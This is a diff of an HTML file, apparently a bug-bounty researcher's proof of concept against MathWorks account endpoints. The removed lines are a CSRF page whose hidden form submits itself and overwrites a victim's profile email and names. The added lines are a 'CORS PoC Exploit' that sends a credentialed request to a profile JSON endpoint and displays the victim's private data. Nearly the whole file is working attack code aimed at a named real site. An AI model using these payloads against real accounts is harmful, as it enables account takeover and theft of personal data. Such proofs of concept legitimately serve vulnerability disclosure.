@@ -1,22 +1,29 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <form action="https://www.mathworks.com/mwaccount/profiles/update" method="POST" enctype="multipart/form-data">
-      <input type="hidden" name="&#95;method" value="put" />
-      <input type="hidden" name="profile&#91;email&#95;address&#93;" value="mudhaxk&#43;3&#64;bugcrowdninja&#46;com" />
-      <input type="hidden" name="profile&#91;first&#95;name&#93;" value="Aderonmulo" />
-      <input type="hidden" name="profile&#91;last&#95;name&#93;" value="Ariyo" />
-      <input type="hidden" name="profile&#91;country&#93;" value="US" />
-      <input type="hidden" name="profile&#91;picture&#93;" value="" />
-      <input type="hidden" name="profile&#91;latin&#95;last&#95;name&#93;" value="" />
-      <input type="hidden" name="profile&#91;latin&#95;first&#95;name&#93;" value="" />
-      <input type="hidden" name="profile&#91;redirect&#95;uri&#93;" value="" />
-      <input type="hidden" name="profile&#91;form&#95;type&#93;" value="" />
-      <input type="hidden" name="button" value="" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    </script>
-  </body>
+<head>
+<title>CORS PoC Exploit</title>
+</head>
+<body>
+<center>
+
+<h1>CORS Exploit<br>Mudhaxk</h1>
+<hr>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+<script type="text/javascript">
+ function cors() {
+   var xhttp = new XMLHttpRequest();
+   xhttp.onreadystatechange = function() {
+     if(this.readyState == 4 && this.status == 200) {
+        document.getElementById("demo").innerHTML = this.responseText;
+     }
+   };
+ xhttp.open("GET", "https://www.mathworks.com/bin/mathworks/profile.json", true);
+ xhttp.withCredentials = true;
+ xhttp.send();
+ }
+</script>
+</center>
+</body>
 </html>
